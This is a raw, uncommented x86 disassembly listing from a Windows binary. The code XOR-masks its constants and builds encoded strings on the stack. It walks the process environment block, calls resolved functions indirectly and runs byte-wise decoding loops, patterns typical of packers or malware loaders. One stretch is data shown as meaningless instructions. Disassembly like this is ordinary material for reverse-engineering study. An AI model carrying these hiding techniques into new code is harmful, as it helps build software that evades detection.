  424820:	inc    DWORD PTR [ebp-0x24]
  424823:	mov    ecx,DWORD PTR [ebp-0x1c]
  424826:	add    ecx,0x2
  424829:	mov    edi,DWORD PTR [ebp-0x4]
  42482c:	mov    eax,edi
  42482e:	sub    eax,DWORD PTR [ebp+0x24]
  424831:	cmp    DWORD PTR [ebp-0x24],eax
  424834:	ja     0x424880
  424836:	mov    esi,edi
  424838:	sub    esi,DWORD PTR [ebp-0x24]
  42483b:	mov    edx,DWORD PTR [ebp+0x28]
  42483e:	lods   al,BYTE PTR ds:[esi]
  42483f:	stos   BYTE PTR es:[edi],al
  424840:	cmp    edi,edx
  424842:	jae    0x424847
  424844:	dec    ecx
  424845:	jne    0x42483e
  424847:	mov    DWORD PTR [ebp-0x4],edi
  42484a:	movzx  esi,al
  42484d:	cmp    edi,DWORD PTR [ebp+0x28]
  424850:	jb     0x4245b1
  424856:	call   0x424885
  42485b:	sub    eax,eax
  42485d:	lea    ebp,[esp+0x3c]
  424861:	mov    edx,DWORD PTR [ebp+0x20]
  424864:	mov    esi,DWORD PTR [ebp-0x8]
  424867:	sub    esi,DWORD PTR [ebp+0x18]
  42486a:	mov    DWORD PTR [edx],esi
  42486c:	mov    edx,DWORD PTR [ebp+0x2c]
  42486f:	mov    edi,DWORD PTR [ebp-0x4]
  424872:	sub    edi,DWORD PTR [ebp+0x24]
  424875:	mov    DWORD PTR [edx],edi
  424877:	leave  
  424878:	pop    ebx
  424879:	pop    esi
  42487a:	pop    edi
  42487b:	ret    0x1c
  42487e:	pop    esi
  42487f:	pop    eax
  424880:	sub    eax,eax
  424882:	inc    eax
  424883:	jmp    0x42485d
  424885:	cmp    ebx,0x1000000
  42488b:	jb     0x42488e
  42488d:	ret    
  42488e:	shl    ebx,0x8
  424891:	push   esi
  424892:	mov    esi,DWORD PTR [ebp-0x8]
  424895:	cmp    esi,DWORD PTR [ebp+0x1c]
  424898:	jae    0x42487e
  42489a:	mov    eax,DWORD PTR [ebp-0x20]
  42489d:	shl    eax,0x8
  4248a0:	lods   al,BYTE PTR ds:[esi]
  4248a1:	scas   eax,DWORD PTR es:[edi]
  4248a2:	sahf   
  4248a3:	or     al,0xaf
  4248a5:	pop    esi
  4248a6:	ins    BYTE PTR es:[edi],dx
  4248a7:	add    bl,BYTE PTR [eax-0x3a634149]
  4248ad:	arpl   WORD PTR [eax+edx*4-0x616a66f0],cx
  4248b4:	sub    al,0x95
  4248b6:	nop
  4248b7:	cmp    BYTE PTR [ecx-0x6a739c3b],ah
  4248bd:	sahf   
  4248be:	pushf  
  4248bf:	mov    bh,0x3e
  4248c1:	lods   al,BYTE PTR ds:[esi]
  4248c2:	mov    edi,0x35899e3a
  4248c7:	mov    WORD PTR [edi-0x707661c6],?
  4248cd:	js     0x424858
  4248cf:	mov    DWORD PTR [ecx-0x4806a973],ecx
  4248d5:	mov    edx,0x1a906919
  4248da:	sbb    DWORD PTR [ecx],ecx
  4248dc:	test   eax,0xfa19ba75
  4248e1:	push   esi
  4248e2:	sti    
  4248e3:	mov    bl,0xcd
  4248e5:	mov    BYTE PTR [edx+0x18906919],bl
  4248eb:	test   eax,0x919daab
  4248f0:	mov    bh,0xb8
  4248f2:	lds    esp,FWORD PTR [edi-0x22]
  4248f5:	mov    DWORD PTR [eax+0x47c5b530],edx
  4248fb:	mov    ah,0x6d
  4248fd:	mov    edx,0xe5560919
  424902:	mov    bh,0xf0
  424904:	outs   dx,DWORD PTR ds:[esi]
  424905:	mov    DWORD PTR [ecx-0x4bca7677],ebp
  42490b:	nop
  42490c:	xor    BYTE PTR [ebp-0x764172de],bl
  424912:	xchg   ebp,eax
  424913:	mov    WORD PTR [edi-0x6775e6c6],?
  424919:	nop
  42491a:	xor    al,0x9d
  42491c:	sub    eax,0x350919ba
  424921:	fldenv [esi+0x29]
  424924:	push   ebp
  424925:	add    BYTE PTR [ebx],al
  424927:	rol    BYTE PTR [ebx+0x6c8d01c0],0x24
  42492e:	inc    eax
  42492f:	ret    
  424930:	push   ebp
  424931:	mov    ebp,esp
  424933:	sub    esp,0x12c
  424939:	push   ebx
  42493a:	push   esi
  42493b:	push   edi
  42493c:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  424943:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42494a:	mov    eax,DWORD PTR [ebp+0x8]
  42494d:	mov    DWORD PTR [ebp+0x8],eax
  424950:	mov    ecx,DWORD PTR [ebp-0x10]
  424953:	mov    ebx,0x75108af
  424958:	xor    ecx,ebx
  42495a:	mov    eax,0x3272f6
  42495f:	add    ecx,eax
  424961:	mov    DWORD PTR [ebp-0x2c],ecx
  424964:	mov    ecx,DWORD PTR [ebp-0x10]
  424967:	xor    ecx,ebx
  424969:	add    ecx,eax
  42496b:	mov    DWORD PTR [ebp-0x3c],ecx
  42496e:	mov    ecx,DWORD PTR [ebp-0x10]
  424971:	xor    ecx,ebx
  424973:	add    ecx,eax
  424975:	mov    DWORD PTR [ebp-0x40],ecx
  424978:	mov    ecx,DWORD PTR [ebp-0x10]
  42497b:	xor    ecx,ebx
  42497d:	add    ecx,eax
  42497f:	mov    DWORD PTR [ebp-0xd8],ecx
  424985:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  42498c:	mov    DWORD PTR [ebp-0x40],0xf89cb5a5
  424993:	mov    DWORD PTR [ebp-0x54],0xf89c85a1
  42499a:	push   0x25
  42499c:	pop    ecx
  42499d:	mov    DWORD PTR [ebp-0x38],ecx
  4249a0:	mov    DWORD PTR [ebp-0x38],ecx
  4249a3:	push   0x65
  4249a5:	pop    ecx
  4249a6:	mov    DWORD PTR [ebp-0x38],ecx
  4249a9:	mov    DWORD PTR [ebp-0x38],ecx
  4249ac:	mov    DWORD PTR [ebp-0x38],0x4d
  4249b3:	mov    DWORD PTR [ebp-0x38],0x43
  4249ba:	mov    ecx,DWORD PTR [ebp-0x10]
  4249bd:	xor    ecx,ebx
  4249bf:	add    ecx,eax
  4249c1:	mov    DWORD PTR [ebp-0x38],ecx
  4249c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4249c7:	xor    ecx,ebx
  4249c9:	add    ecx,eax
  4249cb:	mov    DWORD PTR [ebp-0x38],ecx
  4249ce:	mov    DWORD PTR [ebp-0x28],0x258
  4249d5:	mov    DWORD PTR [ebp-0x20],0x36
  4249dc:	mov    DWORD PTR [ebp-0x14],0x7a
  4249e3:	lea    edi,[ebp-0x10c]
  4249e9:	lea    esi,[ebp-0x12c]
  4249ef:	call   0x4256b1
  4249f4:	dec    DWORD PTR [ebp-0x14]
  4249f7:	jne    0x4249e3
  4249f9:	dec    DWORD PTR [ebp-0x20]
  4249fc:	jne    0x4249dc
  4249fe:	dec    DWORD PTR [ebp-0x28]
  424a01:	jne    0x4249d5
  424a03:	mov    DWORD PTR [ebp-0x28],0x400e
  424a0a:	mov    eax,DWORD PTR [ebp-0x10]
  424a0d:	xor    eax,ebx
  424a0f:	mov    esi,0x3272f6
  424a14:	add    eax,esi
  424a16:	mov    DWORD PTR [ebp-0x1c],eax
  424a19:	mov    eax,DWORD PTR [ebp-0x10]
  424a1c:	and    DWORD PTR [ebp-0x94],0x0
  424a23:	xor    eax,ebx
  424a25:	add    eax,esi
  424a27:	mov    DWORD PTR [ebp-0x34],eax
  424a2a:	mov    eax,fs:0x18
  424a30:	mov    DWORD PTR [ebp-0x94],eax
  424a36:	mov    eax,DWORD PTR [eax+0x30]
  424a39:	mov    DWORD PTR [ebp-0xcc],eax
  424a3f:	mov    eax,DWORD PTR [eax+0xc]
  424a42:	mov    DWORD PTR [ebp-0xc0],eax
  424a48:	mov    eax,DWORD PTR [ebp+0x8]
  424a4b:	lea    ecx,[ebp-0x94]
  424a51:	mov    DWORD PTR [eax+0x1a0],ecx
  424a57:	mov    eax,DWORD PTR [ebp+0x8]
  424a5a:	lea    ecx,[ebp-0xcc]
  424a60:	mov    DWORD PTR [eax+0x1a4],ecx
  424a66:	mov    eax,DWORD PTR [ebp+0x8]
  424a69:	push   DWORD PTR [ebp+0x8]
  424a6c:	lea    ecx,[ebp-0xc0]
  424a72:	mov    DWORD PTR [eax+0x1a8],ecx
  424a78:	call   0x426e72
  424a7d:	mov    ecx,DWORD PTR [ebp-0x10]
  424a80:	xor    ecx,ebx
  424a82:	add    ecx,esi
  424a84:	cmp    ecx,eax
  424a86:	je     0x424e09
  424a8c:	mov    eax,DWORD PTR [ebp+0x8]
  424a8f:	mov    eax,DWORD PTR [eax+0x194]
  424a95:	mov    ecx,DWORD PTR [eax]
  424a97:	mov    eax,DWORD PTR [ebp+0x8]
  424a9a:	mov    eax,DWORD PTR [eax+0x194]
  424aa0:	mov    eax,DWORD PTR [eax]
  424aa2:	add    eax,DWORD PTR [ecx+0x3c]
  424aa5:	mov    ecx,DWORD PTR [ebp+0x8]
  424aa8:	mov    ecx,DWORD PTR [ecx+0x1e0]
  424aae:	lea    edx,[ebp-0xec]
  424ab4:	push   edx
  424ab5:	mov    edx,DWORD PTR [ebp+0x8]
  424ab8:	mov    edx,DWORD PTR [edx+0x18c]
  424abe:	mov    edx,DWORD PTR [edx]
  424ac0:	add    edx,DWORD PTR [eax+0x88]
  424ac6:	push   0x4
  424ac8:	push   DWORD PTR [eax+0x8c]
  424ace:	push   edx
  424acf:	call   DWORD PTR [ecx+0x1c]
  424ad2:	push   DWORD PTR [ebp+0x8]
  424ad5:	xor    eax,eax
  424ad7:	mov    DWORD PTR [ebp-0xa8],0x1b40103a
  424ae1:	mov    DWORD PTR [ebp-0xa4],0x14371122
  424aeb:	mov    DWORD PTR [ebp-0xa0],0x42111e0c
  424af5:	mov    BYTE PTR [ebp-0x9c],0x83
  424afc:	lea    edi,[ebp-0x9b]
  424b02:	stos   DWORD PTR es:[edi],eax
  424b03:	stos   WORD PTR es:[edi],ax
  424b05:	stos   BYTE PTR es:[edi],al
  424b06:	xor    eax,eax
  424b08:	mov    DWORD PTR [ebp-0xbc],0x1b40103a
  424b12:	mov    DWORD PTR [ebp-0xb8],0x14371122
  424b1c:	mov    DWORD PTR [ebp-0xb4],0x2c111e0c
  424b26:	mov    BYTE PTR [ebp-0xb0],0x83
  424b2d:	lea    edi,[ebp-0xaf]
  424b33:	stos   DWORD PTR es:[edi],eax
  424b34:	stos   WORD PTR es:[edi],ax
  424b36:	stos   BYTE PTR es:[edi],al
  424b37:	mov    edi,DWORD PTR [ebp+0x8]
  424b3a:	mov    eax,DWORD PTR [ebp+0x8]
  424b3d:	mov    edx,DWORD PTR [eax+0x1b8]
  424b43:	mov    DWORD PTR [ebp-0x68],0x110f1017
  424b4a:	mov    DWORD PTR [ebp-0x64],0x1a131620
  424b51:	mov    WORD PTR [ebp-0x60],0x8342
  424b57:	mov    DWORD PTR [ebp-0x90],0x1b40103a
  424b61:	mov    DWORD PTR [ebp-0x8c],0x17421122
  424b6b:	mov    DWORD PTR [ebp-0x88],0x35221b13
  424b75:	mov    DWORD PTR [ebp-0x84],0x111e160e
  424b7f:	mov    DWORD PTR [ebp-0x80],0x8342201a
  424b86:	mov    DWORD PTR [ebp-0x7c],0x1b40103a
  424b8d:	mov    DWORD PTR [ebp-0x78],0x17421122
  424b94:	mov    DWORD PTR [ebp-0x74],0x35221b13
  424b9b:	mov    DWORD PTR [ebp-0x70],0x111e160e
  424ba2:	mov    DWORD PTR [ebp-0x6c],0x832c201a
  424ba9:	call   0x426ea1
  424bae:	push   eax
  424baf:	mov    eax,DWORD PTR [ebp+0x8]
  424bb2:	mov    eax,DWORD PTR [eax+0x1a8]
  424bb8:	push   DWORD PTR [eax]
  424bba:	call   0x426b42
  424bbf:	test   eax,eax
  424bc1:	jne    0x424c13
  424bc3:	mov    eax,DWORD PTR [ebp+0x8]
  424bc6:	mov    eax,DWORD PTR [eax+0x1e0]
  424bcc:	mov    edi,DWORD PTR [ebp+0x8]
  424bcf:	add    eax,0x4
  424bd2:	mov    DWORD PTR [ebp-0x24],eax
  424bd5:	mov    eax,DWORD PTR [ebp+0x8]
  424bd8:	mov    edx,DWORD PTR [eax+0x1b8]
  424bde:	call   0x426ea1
  424be3:	push   eax
  424be4:	mov    eax,DWORD PTR [ebp-0x24]
  424be7:	call   DWORD PTR [eax]
  424be9:	test   eax,eax
  424beb:	jne    0x424c13
  424bed:	mov    eax,DWORD PTR [ebp+0x8]
  424bf0:	mov    eax,DWORD PTR [eax+0x1e0]
  424bf6:	mov    edi,DWORD PTR [ebp+0x8]
  424bf9:	add    eax,0x10
  424bfc:	mov    DWORD PTR [ebp-0x24],eax
  424bff:	mov    eax,DWORD PTR [ebp+0x8]
  424c02:	mov    edx,DWORD PTR [eax+0x1b8]
  424c08:	call   0x426ea1
  424c0d:	push   eax
  424c0e:	mov    eax,DWORD PTR [ebp-0x24]
  424c11:	call   DWORD PTR [eax]
  424c13:	mov    eax,DWORD PTR [ebp-0x10]
  424c16:	mov    ecx,DWORD PTR [ebp-0x28]
  424c19:	xor    eax,ebx
  424c1b:	add    eax,esi
  424c1d:	cmp    eax,ecx
  424c1f:	je     0x424de2
  424c25:	mov    eax,DWORD PTR [ebp-0x18]
  424c28:	xor    eax,ebx
  424c2a:	mov    ecx,0xffcd8d0a
  424c2f:	sub    ecx,eax
  424c31:	add    ecx,DWORD PTR [ebp-0x28]
  424c34:	mov    eax,DWORD PTR [ebp-0x1c]
  424c37:	cmp    eax,ecx
  424c39:	ja     0x424de2
  424c3f:	mov    DWORD PTR [ebp-0x20],0x0
  424c46:	push   DWORD PTR [ebp+0x8]
  424c49:	mov    edi,DWORD PTR [ebp+0x8]
  424c4c:	mov    eax,DWORD PTR [ebp+0x8]
  424c4f:	mov    edx,DWORD PTR [eax+0x1b4]
  424c55:	call   0x426ea1
  424c5a:	push   eax
  424c5b:	mov    eax,DWORD PTR [ebp+0x8]
  424c5e:	mov    eax,DWORD PTR [eax+0x1a8]
  424c64:	push   DWORD PTR [eax]
  424c66:	call   0x426b42
  424c6b:	mov    ecx,DWORD PTR [ebp+0x8]
  424c6e:	mov    ecx,DWORD PTR [ecx+0x19c]
  424c74:	mov    DWORD PTR [ecx],eax
  424c76:	mov    eax,DWORD PTR [ebp+0x8]
  424c79:	mov    edi,DWORD PTR [eax+0x1e0]
  424c7f:	mov    esi,DWORD PTR [ebp+0x8]
  424c82:	xor    eax,eax
  424c84:	lea    edx,[ebp-0x7c]
  424c87:	call   0x426ed7
  424c8c:	push   eax
  424c8d:	mov    eax,DWORD PTR [ebp+0x8]
  424c90:	mov    eax,DWORD PTR [eax+0x19c]
  424c96:	push   DWORD PTR [eax]
  424c98:	call   DWORD PTR [edi+0x8]
  424c9b:	mov    DWORD PTR [ebp-0x24],eax
  424c9e:	mov    eax,DWORD PTR [ebp+0x8]
  424ca1:	mov    edi,DWORD PTR [eax+0x1e0]
  424ca7:	mov    esi,DWORD PTR [ebp+0x8]
  424caa:	xor    eax,eax
  424cac:	lea    edx,[ebp-0x90]
  424cb2:	call   0x426ed7
  424cb7:	push   eax
  424cb8:	mov    eax,DWORD PTR [ebp+0x8]
  424cbb:	mov    eax,DWORD PTR [eax+0x19c]
  424cc1:	push   DWORD PTR [eax]
  424cc3:	call   DWORD PTR [edi+0x8]
  424cc6:	mov    eax,DWORD PTR [ebp+0x8]
  424cc9:	mov    edi,DWORD PTR [eax+0x1e0]
  424ccf:	mov    esi,DWORD PTR [ebp+0x8]
  424cd2:	xor    eax,eax
  424cd4:	lea    edx,[ebp-0xa8]
  424cda:	call   0x426ed7
  424cdf:	push   eax
  424ce0:	mov    eax,DWORD PTR [ebp+0x8]
  424ce3:	mov    eax,DWORD PTR [eax+0x19c]
  424ce9:	push   DWORD PTR [eax]
  424ceb:	call   DWORD PTR [edi+0x8]
  424cee:	and    DWORD PTR [ebp-0x8],0x0
  424cf2:	mov    DWORD PTR [ebp-0x44],eax
  424cf5:	mov    eax,DWORD PTR [ebp-0x8]
  424cf8:	and    eax,0x7
  424cfb:	add    eax,0x31
  424cfe:	push   eax
  424cff:	call   DWORD PTR [ebp-0x24]
  424d02:	test   eax,eax
  424d04:	je     0x424d48
  424d06:	mov    eax,DWORD PTR [ebp-0x8]
  424d09:	push   0x19
  424d0b:	xor    edx,edx
  424d0d:	pop    ecx
  424d0e:	div    ecx
  424d10:	add    dl,0x41
  424d13:	movzx  eax,dl
  424d16:	push   eax
  424d17:	call   DWORD PTR [ebp-0x44]
  424d1a:	test   eax,eax
  424d1c:	jne    0x424d48
  424d1e:	mov    eax,DWORD PTR [ebp+0x8]
  424d21:	mov    edi,DWORD PTR [eax+0x1e0]
  424d27:	mov    esi,DWORD PTR [ebp+0x8]
  424d2a:	xor    eax,eax
  424d2c:	lea    edx,[ebp-0x68]
  424d2f:	call   0x426ed7
  424d34:	push   eax
  424d35:	mov    eax,DWORD PTR [ebp+0x8]
  424d38:	mov    eax,DWORD PTR [eax+0x198]
  424d3e:	push   DWORD PTR [eax]
  424d40:	call   DWORD PTR [edi+0x8]
  424d43:	mov    DWORD PTR [ebp-0x14],eax
  424d46:	jmp    0x424d4c
  424d48:	and    DWORD PTR [ebp-0x14],0x0
  424d4c:	inc    DWORD PTR [ebp-0x8]
  424d4f:	cmp    DWORD PTR [ebp-0x8],0x10
  424d53:	jb     0x424cf5
  424d55:	mov    eax,DWORD PTR [ebp-0x18]
  424d58:	mov    esi,DWORD PTR [ebp+0x8]
  424d5b:	xor    eax,ebx
  424d5d:	mov    edi,0x3272f6
  424d62:	add    eax,edi
  424d64:	lea    edx,[ebp-0x10c]
  424d6a:	call   0x426ed7
  424d6f:	push   eax
  424d70:	mov    eax,DWORD PTR [ebp-0x10]
  424d73:	mov    esi,DWORD PTR [ebp+0x8]
  424d76:	xor    eax,ebx
  424d78:	add    eax,edi
  424d7a:	lea    edx,[ebp-0x12c]
  424d80:	call   0x426ed7
  424d85:	push   eax
  424d86:	call   DWORD PTR [ebp-0x14]
  424d89:	mov    ecx,DWORD PTR [ebp-0x10]
  424d8c:	xor    ecx,ebx
  424d8e:	add    ecx,edi
  424d90:	cmp    ecx,eax
  424d92:	jne    0x424d9b
  424d94:	mov    DWORD PTR [ebp-0x20],0x1
  424d9b:	mov    eax,DWORD PTR [ebp-0x18]
  424d9e:	mov    ecx,DWORD PTR [ebp-0x1c]
  424da1:	xor    eax,ebx
  424da3:	lea    eax,[eax+ecx*1+0x3272f6]
  424daa:	mov    DWORD PTR [ebp-0x1c],eax
  424dad:	mov    eax,DWORD PTR [ebp-0x20]
  424db0:	test   eax,eax
  424db2:	je     0x424dc6
  424db4:	mov    eax,DWORD PTR [ebp-0x18]
  424db7:	mov    ecx,DWORD PTR [ebp-0x34]
  424dba:	xor    eax,ebx
  424dbc:	lea    eax,[eax+ecx*1+0x3272f6]
  424dc3:	mov    DWORD PTR [ebp-0x34],eax
  424dc6:	mov    eax,DWORD PTR [ebp-0x18]
  424dc9:	xor    eax,ebx
  424dcb:	mov    ecx,0xffcd8d0a
  424dd0:	sub    ecx,eax
  424dd2:	add    ecx,DWORD PTR [ebp-0x28]
  424dd5:	mov    eax,DWORD PTR [ebp-0x1c]
  424dd8:	cmp    eax,ecx
  424dda:	jbe    0x424c3f
  424de0:	mov    esi,edi
  424de2:	mov    eax,DWORD PTR [ebp-0x34]
  424de5:	mov    ecx,DWORD PTR [ebp-0x1c]
  424de8:	cmp    ecx,eax
  424dea:	jne    0x424dfd
  424dec:	push   DWORD PTR [ebp+0x8]
  424def:	lea    eax,[ebp-0x3c]
  424df2:	push   eax
  424df3:	call   0x427946
  424df8:	mov    DWORD PTR [ebp-0x2c],eax
  424dfb:	jmp    0x424e09
  424dfd:	mov    eax,DWORD PTR [ebp-0x2c]
  424e00:	mov    ecx,DWORD PTR [ebp-0x18]
  424e03:	xor    ecx,ebx
  424e05:	add    ecx,esi
  424e07:	xor    DWORD PTR [eax],ecx
  424e09:	mov    eax,DWORD PTR [ebp-0x10]
  424e0c:	mov    ecx,DWORD PTR [ebp-0x2c]
  424e0f:	xor    eax,ebx
  424e11:	add    eax,esi
  424e13:	cmp    eax,ecx
  424e15:	je     0x42558f
  424e1b:	mov    eax,DWORD PTR [ebp-0x10]
  424e1e:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e21:	xor    eax,ebx
  424e23:	add    eax,esi
  424e25:	cmp    eax,ecx
  424e27:	je     0x42558f
  424e2d:	mov    eax,DWORD PTR [ebp-0x10]
  424e30:	xor    eax,ebx
  424e32:	add    eax,esi
  424e34:	jmp    0x424e52
  424e36:	mov    edi,DWORD PTR [ebp-0x2c]
  424e39:	mov    cl,al
  424e3b:	and    cl,0x1f
  424e3e:	or     dl,0xff
  424e41:	sub    dl,cl
  424e43:	add    BYTE PTR [edi+eax*1],dl
  424e46:	mov    ecx,DWORD PTR [ebp-0x18]
  424e49:	xor    ecx,ebx
  424e4b:	lea    eax,[eax+ecx*1+0x3272f6]
  424e52:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e55:	cmp    eax,ecx
  424e57:	jb     0x424e36
  424e59:	mov    eax,DWORD PTR [ebp-0x3c]
  424e5c:	mov    DWORD PTR [ebp-0x28],eax
  424e5f:	mov    eax,DWORD PTR [ebp-0x2c]
  424e62:	mov    DWORD PTR [ebp-0x34],0xf89c85a5
  424e69:	mov    DWORD PTR [ebp-0xd4],eax
  424e6f:	mov    edi,0xf89c85a4
  424e74:	mov    DWORD PTR [ebp-0x30],edi
  424e77:	mov    eax,DWORD PTR [ebp-0x34]
  424e7a:	xor    eax,ebx
  424e7c:	add    eax,esi
  424e7e:	mov    DWORD PTR [ebp-0xc],eax
  424e81:	mov    eax,DWORD PTR [ebp-0x34]
  424e84:	xor    eax,ebx
  424e86:	add    eax,esi
  424e88:	mov    DWORD PTR [ebp-0x8],eax
  424e8b:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  424e92:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  424e99:	mov    eax,DWORD PTR [ebp-0x34]
  424e9c:	mov    ecx,DWORD PTR [ebp-0x28]
  424e9f:	xor    eax,ebx
  424ea1:	add    eax,esi
  424ea3:	cmp    ecx,eax
  424ea5:	je     0x4250a4
  424eab:	jmp    0x425080
  424eb0:	mov    ecx,DWORD PTR [ebp-0xc]
  424eb3:	mov    eax,DWORD PTR [ebp-0x28]
  424eb6:	sub    eax,ecx
  424eb8:	mov    ecx,DWORD PTR [ebp-0x44]
  424ebb:	xor    ecx,ebx
  424ebd:	add    ecx,esi
  424ebf:	xor    edx,edx
  424ec1:	div    ecx
  424ec3:	mov    DWORD PTR [ebp-0x8],eax
  424ec6:	mov    eax,DWORD PTR [ebp-0x4c]
  424ec9:	mov    ecx,DWORD PTR [ebp-0x8]
  424ecc:	xor    eax,ebx
  424ece:	add    eax,esi
  424ed0:	cmp    ecx,eax
  424ed2:	jbe    0x424ede
  424ed4:	mov    eax,DWORD PTR [ebp-0x4c]
  424ed7:	xor    eax,ebx
  424ed9:	add    eax,esi
  424edb:	mov    DWORD PTR [ebp-0x8],eax
  424ede:	mov    eax,DWORD PTR [ebp-0x44]
  424ee1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ee4:	xor    eax,ebx
  424ee6:	add    eax,esi
  424ee8:	imul   eax,ecx
  424eeb:	mov    DWORD PTR [ebp-0x8],eax
  424eee:	mov    eax,DWORD PTR [ebp-0x34]
  424ef1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ef4:	xor    eax,ebx
  424ef6:	add    eax,esi
  424ef8:	cmp    ecx,eax
  424efa:	je     0x42506e
  424f00:	mov    eax,DWORD PTR [ebp-0x8]
  424f03:	mov    DWORD PTR [ebp-0x14],eax
  424f06:	mov    eax,DWORD PTR [ebp-0xc]
  424f09:	add    eax,DWORD PTR [ebp-0xd4]
  424f0f:	mov    DWORD PTR [ebp-0x24],0xf89c85a5
  424f16:	mov    DWORD PTR [ebp-0x20],edi
  424f19:	mov    DWORD PTR [ebp-0xe8],0xf89c85a3
  424f23:	mov    DWORD PTR [ebp-0x8],eax
  424f26:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  424f2d:	mov    DWORD PTR [ebp-0x1c],edi
  424f30:	mov    eax,DWORD PTR [ebp-0x24]
  424f33:	xor    eax,ebx
  424f35:	add    eax,esi
  424f37:	jmp    0x42502d
  424f3c:	mov    DWORD PTR [ebp-0xe0],0xf89c85ba
  424f46:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  424f50:	mov    eax,DWORD PTR [ebp-0x1c]
  424f53:	mov    ecx,DWORD PTR [ebp-0x48]
  424f56:	xor    eax,ebx
  424f58:	add    eax,esi
  424f5a:	imul   eax,ecx
  424f5d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f60:	mov    al,BYTE PTR [eax+ecx*1]
  424f63:	mov    BYTE PTR [ebp-0x2],al
  424f66:	mov    eax,DWORD PTR [ebp-0x1c]
  424f69:	mov    ecx,DWORD PTR [ebp-0x48]
  424f6c:	xor    eax,ebx
  424f6e:	add    eax,esi
  424f70:	imul   eax,ecx
  424f73:	mov    ecx,DWORD PTR [ebp-0xe8]
  424f79:	xor    ecx,ebx
  424f7b:	add    eax,ecx
  424f7d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f80:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424f88:	mov    ecx,DWORD PTR [ebp-0xe0]
  424f8e:	xor    ecx,ebx
  424f90:	lea    eax,[ecx+eax*1+0x3272f6]
  424f97:	movzx  ecx,BYTE PTR [ebp-0x2]
  424f9b:	xor    ecx,eax
  424f9d:	mov    BYTE PTR [ebp-0x2],cl
  424fa0:	mov    al,BYTE PTR [ebp-0x2]
  424fa3:	mov    ecx,DWORD PTR [ebp-0x1c]
  424fa6:	mov    edx,DWORD PTR [ebp-0x48]
  424fa9:	xor    ecx,ebx
  424fab:	add    ecx,esi
  424fad:	imul   ecx,edx
  424fb0:	mov    edx,DWORD PTR [ebp-0x8]
  424fb3:	mov    BYTE PTR [ecx+edx*1],al
  424fb6:	mov    eax,DWORD PTR [ebp-0x1c]
  424fb9:	mov    ecx,DWORD PTR [ebp-0x48]
  424fbc:	xor    eax,ebx
  424fbe:	add    eax,esi
  424fc0:	imul   eax,ecx
  424fc3:	mov    ecx,DWORD PTR [ebp-0x8]
  424fc6:	mov    al,BYTE PTR [eax+ecx*1]
  424fc9:	mov    BYTE PTR [ebp-0x2],al
  424fcc:	mov    eax,DWORD PTR [ebp-0x1c]
  424fcf:	mov    ecx,DWORD PTR [ebp-0x48]
  424fd2:	xor    eax,ebx
  424fd4:	add    eax,esi
  424fd6:	imul   eax,ecx
  424fd9:	mov    ecx,DWORD PTR [ebp-0x20]
  424fdc:	xor    ecx,ebx
  424fde:	add    eax,ecx
  424fe0:	mov    ecx,DWORD PTR [ebp-0x8]
  424fe3:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424feb:	mov    ecx,DWORD PTR [ebp-0xc4]
  424ff1:	xor    ecx,ebx
  424ff3:	lea    eax,[ecx+eax*1+0x3272f6]
  424ffa:	movzx  ecx,BYTE PTR [ebp-0x2]
  424ffe:	xor    ecx,eax
  425000:	mov    BYTE PTR [ebp-0x2],cl
  425003:	mov    al,BYTE PTR [ebp-0x2]
  425006:	mov    ecx,DWORD PTR [ebp-0x1c]
  425009:	mov    edx,DWORD PTR [ebp-0x48]
  42500c:	xor    ecx,ebx
  42500e:	add    ecx,esi
  425010:	imul   ecx,edx
  425013:	mov    edx,DWORD PTR [ebp-0x8]
  425016:	mov    BYTE PTR [ecx+edx*1],al
  425019:	mov    eax,DWORD PTR [ebp-0x38]
  42501c:	mov    ecx,DWORD PTR [ebp-0x20]
  42501f:	xor    eax,ebx
  425021:	xor    ecx,ebx
  425023:	add    eax,esi
  425025:	add    ecx,esi
  425027:	imul   eax,ecx
  42502a:	add    eax,DWORD PTR [ebp-0x48]
  42502d:	mov    DWORD PTR [ebp-0x48],eax
  425030:	mov    eax,DWORD PTR [ebp-0x48]
  425033:	mov    ecx,DWORD PTR [ebp-0x14]
  425036:	cmp    ecx,eax
  425038:	jb     0x424f3c
  42503e:	mov    eax,DWORD PTR [ebp-0x20]
  425041:	mov    ecx,DWORD PTR [ebp-0x14]
  425044:	xor    eax,ebx
  425046:	add    eax,esi
  425048:	imul   eax,ecx
  42504b:	mov    ecx,DWORD PTR [ebp-0x24]
  42504e:	xor    ecx,ebx
  425050:	add    ecx,esi
  425052:	or     eax,ecx
  425054:	mov    ecx,DWORD PTR [ebp-0x30]
  425057:	xor    ecx,ebx
  425059:	add    eax,ecx
  42505b:	mov    ecx,DWORD PTR [ebp-0x30]
  42505e:	xor    ecx,ebx
  425060:	add    eax,ecx
  425062:	mov    ecx,DWORD PTR [ebp-0xc]
  425065:	lea    eax,[eax+ecx*1+0x64e5ec]
  42506c:	jmp    0x42507d
  42506e:	mov    eax,DWORD PTR [ebp-0x30]
  425071:	mov    ecx,DWORD PTR [ebp-0xc]
  425074:	xor    eax,ebx
  425076:	lea    eax,[eax+ecx*1+0x3272f6]
  42507d:	mov    DWORD PTR [ebp-0xc],eax
  425080:	mov    eax,DWORD PTR [ebp-0x30]
  425083:	xor    eax,ebx
  425085:	mov    ecx,0xffcd8d0a
  42508a:	sub    ecx,eax
  42508c:	add    ecx,DWORD PTR [ebp-0x28]
  42508f:	mov    eax,DWORD PTR [ebp-0x30]
  425092:	mov    edx,DWORD PTR [ebp-0xc]
  425095:	xor    eax,ebx
  425097:	add    eax,esi
  425099:	imul   eax,edx
  42509c:	cmp    eax,ecx
  42509e:	jbe    0x424eb0
  4250a4:	mov    eax,DWORD PTR [ebp-0x10]
  4250a7:	mov    ecx,DWORD PTR [ebp-0x3c]
  4250aa:	mov    eax,DWORD PTR [ebp+0x8]
